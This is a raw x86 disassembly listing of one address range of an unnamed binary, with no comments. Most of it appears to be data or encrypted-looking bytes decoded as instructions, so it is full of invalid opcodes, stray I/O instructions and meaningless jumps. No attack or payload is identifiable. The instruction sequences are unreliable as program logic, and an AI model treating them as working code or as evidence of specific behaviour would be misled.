  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	inc    ebx
  413f01:	mov    bl,BYTE PTR [eax]
  413f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	mov    es,WORD PTR ds:0x2beca21f
  413f12:	iret   
  413f13:	xor    edi,DWORD PTR [edi+ecx*1-0x614b58ad]
  413f1a:	push   ebp
  413f1b:	fs jp  0x413ef4
  413f1e:	or     al,0x49
  413f20:	add    DWORD PTR [ebx],esp
  413f22:	(bad)  
  413f23:	sbb    ah,BYTE PTR [eax]
  413f25:	cmc    
  413f26:	repnz sub edi,eax
  413f29:	frstor [eax]
  413f2b:	mov    ds:0x5cf590c4,al
  413f30:	jbe    0x413ef1
  413f32:	xchg   edi,eax
  413f33:	jecxz  0x413f51
  413f35:	cld    
  413f36:	fucomip st,st(3)
  413f38:	mov    cl,0x96
  413f3a:	sub    dl,BYTE PTR [ecx]
  413f3c:	cmp    al,BYTE PTR [ecx+0x6f]
  413f3f:	inc    edx
  413f40:	dec    ecx
  413f41:	je     0x413f02
  413f43:	or     DWORD PTR [ecx],edi
  413f45:	adc    edi,esp
  413f47:	mov    ds:0xe90e7bdb,al
  413f4c:	call   0x63cc6ca
  413f51:	sbb    eax,esi
  413f53:	ins    DWORD PTR es:[edi],dx
  413f54:	test   eax,0x58a7adc9
  413f59:	jge    0x413edd
  413f5b:	hlt    
  413f5c:	and    DWORD PTR [edx],ebp
  413f5e:	jge    0x413fc3
  413f60:	jecxz  0x413f30
  413f62:	dec    edi
  413f63:	jmp    0x95d80f2e
  413f68:	in     al,dx
  413f69:	shl    BYTE PTR [ecx],cl
  413f6b:	cmp    eax,DWORD PTR [ecx]
  413f6d:	mov    esi,0xdbf6c0d0
  413f72:	add    DWORD PTR [eax-0x29],ecx
  413f75:	xor    BYTE PTR [ebx+0x7a],bl
  413f78:	sub    al,0x4f
  413f7a:	push   ds
  413f7b:	sar    edi,1
  413f7d:	cmp    esi,eax
  413f7f:	pop    ebx
  413f80:	(bad)  
  413f81:	pushf  
  413f82:	add    eax,0x5e3d74ce
  413f87:	adc    DWORD PTR [edx*1-0x7ac5f8c],esp
  413f8e:	pop    ss
  413f8f:	frstor [esi+0xe006cf9]
  413f95:	inc    esp
  413f96:	lea    edx,[edx+edx*2+0x44]
  413f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f9b:	cli    
  413f9c:	in     eax,0xf3
  413f9e:	rcl    ah,cl
  413fa0:	inc    ecx
  413fa1:	cwde   
  413fa2:	mov    eax,ds:0x5a5e34d5
  413fa7:	mov    al,ds:0x2a7f41ae
  413fac:	mov    bh,0x3e
  413fae:	or     eax,0xb005c00
  413fb3:	sbb    cl,BYTE PTR [esi+0x45]
  413fb6:	fistp  DWORD PTR [edi+0x77]
  413fb9:	xchg   ebp,eax
  413fba:	or     cl,bh
  413fbc:	popf   
  413fbd:	and    esi,0xabf4257c
  413fc3:	shr    al,1
  413fc5:	jmp    0x3895ba5
  413fca:	pop    esp
  413fcb:	pop    esp
  413fcc:	lods   eax,DWORD PTR ds:[esi]
  413fcd:	hlt    
  413fce:	mul    BYTE PTR [ebx+0x5e6ab1cc]
  413fd4:	stc    
  413fd5:	lods   eax,DWORD PTR ds:[esi]
  413fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fd7:	fmul   st(4),st
  413fd9:	aad    0x42
  413fdb:	popa   
  413fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fdd:	dec    edx
  413fde:	lds    edi,FWORD PTR [ecx]
  413fe0:	mov    eax,ds:0xc9ee1b0c
  413fe5:	or     edi,esi
  413fe7:	imul   edx,ecx,0xffffffc9
  413fea:	inc    esp
  413feb:	(bad)  
  413fec:	div    ecx
  413fee:	add    cl,bl
  413ff0:	xchg   ebx,eax
  413ff1:	fcom   DWORD PTR [eax-0x3]
  413ff4:	xor    BYTE PTR [esi],0xb3
  413ff7:	pop    eax
  413ff8:	fs in  eax,dx
  413ffa:	dec    eax
  413ffb:	clc    
  413ffc:	clc    
  413ffd:	and    DWORD PTR [eax+0x6a],ecx
  414000:	jns    0x413fc5
  414002:	mov    WORD PTR [esi],fs
  414004:	inc    esi
  414005:	sti    
  414006:	and    eax,0xe6512165
  41400b:	shl    DWORD PTR [eax*1+0x82a2],1
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xf275:0xbd52e96
  414083:	adc    eax,esp
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR [ecx+eax*1],al
  41408a:	add    BYTE PTR [eax],al
  41408c:	loop   0x414030
  41408e:	test   DWORD PTR [ecx+0x38],0xa60ca00b
  414095:	aas    
  414096:	xchg   ebp,eax
  414097:	sbb    al,BYTE PTR [ebp-0x6d]
  41409a:	dec    esp
  41409b:	push   0x6909b777
  4140a0:	jbe    0x4140db
  4140a2:	pop    ss
  4140a3:	repz adc BYTE PTR [esp+edx*8],cl
  4140a7:	fsub   st,st(3)
  4140a9:	cs loope 0x414103
  4140ac:	shl    BYTE PTR [esi-0x46],cl
  4140af:	jbe    0x4140ce
  4140b1:	dec    ebx
  4140b2:	xchg   DWORD PTR [edi-0x3d4df25f],ebx
  4140b8:	ja     0x414103
  4140ba:	xor    eax,ebx
  4140bc:	xchg   esi,eax
  4140bd:	fwait
  4140be:	jo     0x414089
  4140c0:	or     al,0xfe
  4140c2:	add    al,0x38
  4140c4:	jne    0x414120
  4140c6:	sbb    al,BYTE PTR [ebx-0x36]
  4140c9:	mov    edi,0x951f278
  4140ce:	sbb    al,0x51
  4140d0:	push   edi
  4140d1:	sub    edx,DWORD PTR ds:0x86b90d42
  4140d7:	(bad)  
  4140d8:	stos   DWORD PTR es:[edi],eax
  4140d9:	mov    edi,0xb30c563b
  4140de:	add    BYTE PTR [esi+0x63],al
  4140e1:	outs   dx,BYTE PTR ds:[esi]
  4140e2:	add    eax,0x5b0778cb
  4140e7:	dec    ebp
  4140e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140e9:	push   esp
  4140ea:	xlat   BYTE PTR ds:[ebx]
  4140eb:	jmp    0x41406d
  4140ed:	push   ds
  4140ee:	adc    eax,0x2ae2d64f
  4140f3:	sbb    eax,0xf385a8b6
  4140f8:	mov    esp,0x7daed16
  4140fd:	js     0x4140c8
  4140ff:	pop    esi
  414100:	inc    esp
  414101:	push   eax
  414102:	stos   BYTE PTR es:[edi],al
  414103:	in     al,dx
  414104:	dec    ebp
  414105:	mov    eax,0x83ca58fb
  41410a:	mov    ecx,0xbadad5ba
  41410f:	call   0x1fd18755
  414114:	push   DWORD PTR [ebx]
  414116:	dec    esp
  414117:	fs and al,0x86
  41411a:	add    BYTE PTR [edx],0x71
  41411d:	clc    
  41411e:	rcr    BYTE PTR [eax],1
  414120:	mov    esp,0x6387ed38
  414125:	push   esi
  414126:	xor    BYTE PTR [esi+0x0],bh
  414129:	push   0xca09ed02
  41412e:	sbb    ecx,DWORD PTR [edi+0x27]
  414131:	xchg   ebp,eax
  414132:	rcr    BYTE PTR [eax+0x2fed4441],0x5c
  414139:	in     eax,0xbe
  41413b:	add    cl,BYTE PTR [esi+esi*1]
  41413e:	cdq    
  41413f:	imul   DWORD PTR [edx]
  414141:	mov    bh,0x2f
  414143:	loop   0x41412b
  414145:	ret    0x8311
  414148:	jne    0x41411d
  41414a:	mov    dh,0x53
  41414c:	scas   eax,DWORD PTR es:[edi]
  41414d:	and    dh,BYTE PTR [ecx+0x2d]
  414150:	shl    BYTE PTR [esp+eax*8],0xd6
  414154:	pop    esi
  414155:	add    eax,0x94536ffc
  41415a:	mov    bl,0x4d
  41415c:	mov    WORD PTR [ebp+0x43260fe3],es
  414162:	ins    DWORD PTR es:[edi],dx
  414163:	inc    eax
  414164:	dec    esi
  414165:	pop    es
  414166:	fs pop ds
  414168:	aas    
  414169:	inc    ebx
  41416a:	aam    0xd2
  41416c:	dec    esp
  41416d:	stos   BYTE PTR es:[edi],al
  41416e:	or     al,0xeb
  414170:	test   esp,edi
  414172:	xchg   ecx,eax
  414173:	dec    ecx
  414174:	nop
  414175:	add    DWORD PTR [edi+0x44],edi
  414178:	pop    ebx
  414179:	dec    eax
  41417a:	in     al,0xde
  41417c:	in     al,dx
  41417d:	add    edx,edi
  41417f:	mov    DWORD PTR [ebx],edx
  414181:	outs   dx,DWORD PTR ds:[esi]
  414182:	jmp    0x7bfb0c92
  414187:	cmc    
  414188:	add    eax,0x1d813709
  41418d:	xchg   esi,eax
  41418e:	jp     0x41414d
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	jbe    0x414214
  414202:	jg     0x4141dc
  414204:	in     al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	mov    bh,0xd
  41420e:	jle    0x41420c
  414210:	jmp    0xb20f7a78
  414215:	ss stc 
  414217:	test   DWORD PTR [edx],edx
  414219:	retf   
  41421a:	add    BYTE PTR [eax-0x24fe72b4],ch
  414220:	xor    ecx,DWORD PTR ds:0x4b4f62bc
  414226:	enter  0x31a7,0x5a
  41422a:	cs cwde 
  41422c:	and    BYTE PTR [edi+edi*1],bl
  41422f:	mov    dl,0xcd
  414231:	sbb    cl,0x4c
  414234:	mov    ds:0xa07ca410,al
  414239:	retf   0xc3a6
  41423c:	mov    esi,0xee99fce7
  414241:	pop    edi
  414242:	mov    ecx,0x401c3920
  414247:	cmp    eax,0xe004059d
  41424c:	xor    DWORD PTR [eax-0x46],0x20ae5962
  414253:	fcom   QWORD PTR [esi+0x50f57e8a]
  414259:	ins    BYTE PTR es:[edi],dx
  41425a:	scas   al,BYTE PTR es:[edi]
  41425b:	mov    edx,0xb5e58b9
  414260:	test   DWORD PTR [eax+ecx*8],esp
  414263:	pop    edx
  414264:	dec    ecx
  414265:	fsubr  st(4),st
  414267:	sbb    edx,DWORD PTR [esi-0x604999f0]
  41426d:	dec    esi
  41426e:	dec    ecx
  41426f:	adc    al,0x44
  414271:	inc    edi
  414272:	loope  0x41424a
  414274:	ja     0x414271
  414276:	retf   0xec9c
  414279:	ret    
  41427a:	mov    edi,ebp
  41427c:	(bad)  
  41427e:	inc    edi
  41427f:	adc    ebx,DWORD PTR ss:[edi-0x23]
  414283:	pop    edx
  414284:	jle    0x414206
  414286:	mov    esp,0x8d9eb3d0
  41428b:	sbb    ah,ah
  41428d:	xchg   edi,eax
  41428e:	test   eax,0x1ba9b233
  414293:	mov    ebp,0xcfca8f3d
  414298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414299:	jmp    0x4142e7
  41429b:	mov    dh,0x3a
  41429d:	xchg   edx,eax
  41429e:	sets   ch
  4142a1:	popa   
  4142a2:	in     al,dx
  4142a3:	sbb    BYTE PTR [eax-0x302ca5b2],dh
  4142a9:	idiv   BYTE PTR [edx+0x44]
  4142ac:	pop    ss
  4142ad:	mov    ds:0x56e85ffc,al
  4142b2:	jmp    0x41425a
  4142b4:	pop    ss
  4142b5:	mov    ecx,DWORD PTR [esi-0x77]
  4142b8:	stc    
  4142b9:	jecxz  0x414313
  4142bb:	sub    ebp,ebx
  4142bd:	cmp    eax,DWORD PTR [ebx+0x624c366c]
  4142c3:	sub    eax,0x4aa44f85
  4142c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c9:	push   0xffffffb6
  4142cb:	xchg   dl,bh
  4142cd:	movnti DWORD PTR [esi],eax
  4142d0:	push   cs
  4142d1:	outs   dx,DWORD PTR ds:[esi]
  4142d2:	mov    esp,0x9d484952
  4142d7:	out    dx,eax
  4142d8:	shl    BYTE PTR [edi+0x73],1
  4142db:	pop    eax
  4142dc:	mov    ecx,0xdffd1164
  4142e1:	sub    edx,esp
  4142e3:	cmp    bh,0x88
  4142e6:	cmp    dl,BYTE PTR [edi-0x4b1dcd4b]
  4142ec:	jp     0x41431a
  4142ee:	inc    ebp
  4142ef:	cmp    DWORD PTR [edx+0x5f],eax
  4142f2:	adc    dh,dl
  4142f4:	dec    eax
  4142f5:	jle    0x41428c
  4142f7:	sub    eax,0x89637973
  4142fc:	xchg   esi,eax
  4142fd:	jl     0x41432f
  4142ff:	repnz lods al,BYTE PTR ds:[esi]
  414301:	adc    cl,dh
  414303:	add    ebx,DWORD PTR ds:0xba699bc2
  414309:	push   edi
  41430a:	dec    ebx
  41430b:	push   ss
  41430c:	inc    esi
  41430d:	hlt    
  41430e:	(bad)  
  41430f:	call   0x414314
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	jae    0x4143fe
  414382:	dec    ebx
  414383:	dec    ecx
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    BYTE PTR [edi],dh
  41438d:	jo     0x41434b
  41438f:	sub    DWORD PTR [ecx+edi*1],0x86937f88
  414396:	sahf   
  414397:	pop    ds
  414398:	jae    0x414371
  41439a:	std    
  41439b:	int    0x14
  41439d:	xchg   ebx,eax
  41439e:	pop    ecx
  41439f:	fwait
  4143a0:	xor    ah,BYTE PTR [edi]
  4143a2:	int3   
  4143a3:	mov    dh,0xb
  4143a5:	pop    edi
  4143a6:	cdq    
  4143a7:	lods   al,BYTE PTR ds:[esi]
  4143a8:	inc    ebp
  4143a9:	pop    esp
  4143aa:	adc    al,0xb2
  4143ac:	push   0x5d
  4143ae:	test   eax,0x12f59a71
  4143b3:	xchg   esp,eax
  4143b4:	jle    0x4143a1
  4143b6:	mov    ds:0xcfcbd363,al
  4143bb:	pop    ss
  4143bc:	lahf   
  4143bd:	and    bh,BYTE PTR [edi]
  4143bf:	mov    esp,0x5059ef40
  4143c4:	push   0x90a057da
  4143c9:	jne    0x41443c
  4143cb:	cmp    DWORD PTR [ecx+0x4d9f15a],ebp
  4143d1:	jmp    0x414363
  4143d3:	ins    DWORD PTR es:[edi],dx
  4143d4:	outs   dx,DWORD PTR fs:[esi]
  4143d6:	rol    cx,0x29
  4143da:	shl    DWORD PTR [esp+ecx*4],1
  4143dd:	fadd   QWORD PTR [esi]
  4143df:	inc    bp
  4143e1:	jo     0x414397
  4143e3:	mov    edx,esi
  4143e5:	(bad)  
  4143e6:	mov    dh,0xd6
  4143e8:	sub    al,0x81
  4143ea:	push   edi
  4143eb:	mov    bh,0xc7
  4143ed:	mov    eax,0x35c4e1e8
  4143f2:	and    al,0x23
  4143f4:	arpl   WORD PTR [ecx+0x33],si
  4143f7:	add    BYTE PTR [ecx+0x20],dl
  4143fa:	or     DWORD PTR [eax],esp
  4143fc:	xchg   DWORD PTR [ebx-0x46369eed],eax
  414402:	lods   al,BYTE PTR ds:[esi]
  414403:	add    BYTE PTR ds:0x7e6f64a3,dh
  414409:	xlat   BYTE PTR ds:[ebx]
  41440a:	sub    esi,DWORD PTR [esi+0x2c169e8b]
  414410:	or     edx,ecx
  414412:	out    0x93,eax
  414414:	inc    edx
  414415:	into   
  414416:	lea    ebx,[ecx]
  414418:	jg     0x414427
  41441a:	sbb    ebp,esp
  41441c:	das    
  41441d:	inc    esi
  41441e:	add    ch,bh
  414420:	ret    
  414421:	push   0x8debf040
  414426:	lods   eax,DWORD PTR ds:[esi]
  414427:	arpl   WORD PTR [eax+0x701c6192],di
  41442d:	jae    0x4144ae
  41442f:	aaa    
  414430:	sar    DWORD PTR [esi+0x62],0xc8
  414434:	ret    
  414435:	fnstsw WORD PTR [esp+esi*1+0x1f]
  414439:	xor    DWORD PTR [eax-0x31e91d69],esp
  41443f:	outs   dx,BYTE PTR ds:[esi]
  414440:	pop    esi
  414441:	retf   
  414442:	inc    edx
  414443:	fldcw  WORD PTR ds:0x29aae25e
  414449:	cmp    eax,0xbcbc17c5
  41444e:	sbb    al,0x17
  414450:	test   BYTE PTR [edx+0x7c],ah
  414453:	sub    eax,0x7e44b125
